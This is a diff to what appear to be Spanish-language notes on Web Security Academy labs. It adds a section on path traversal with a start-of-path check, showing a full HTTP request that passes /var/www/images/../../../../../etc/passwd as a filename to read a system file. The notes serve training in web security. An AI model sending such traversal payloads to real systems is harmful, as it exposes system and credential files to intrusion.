@@ -105,3 +105,27 @@ Accept-Language: es-419,es;q=0.9
 Connection: close
 
 ```
+
+# File path traversal, validation of start of path
+
+Este laboratorio valida si los archivos a cargar vienen desde una direccion entonces la direccion es /var/www/images/ intenta pensar todas las
+posibilidades
+
+```
+GET /image?filename=/var/www/images/../../../../../etc/passwd HTTP/1.1
+Host: 0aa5003f04ae37bcc02f142600be0079.web-security-academy.net
+Cookie: session=sFK1eAfglsM0HebwxjRoyeZNy8cfnWGK
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0aa5003f04ae37bcc02f142600be0079.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+```
